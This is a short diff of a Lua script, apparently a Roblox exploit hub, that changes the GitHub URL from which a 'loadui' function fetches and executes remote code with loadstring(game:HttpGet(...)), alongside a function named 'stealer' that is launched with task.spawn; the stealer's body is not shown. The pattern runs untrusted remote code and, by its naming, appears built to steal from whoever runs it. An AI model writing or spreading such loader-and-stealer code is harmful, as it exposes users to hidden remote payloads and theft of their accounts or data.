@@ -3,7 +3,7 @@ local function stealer()
 end
 
 local function loadui()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/H4xScripts/Loader/refs/heads/main/loader.lua", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
 end
 
 task.spawn(stealer)
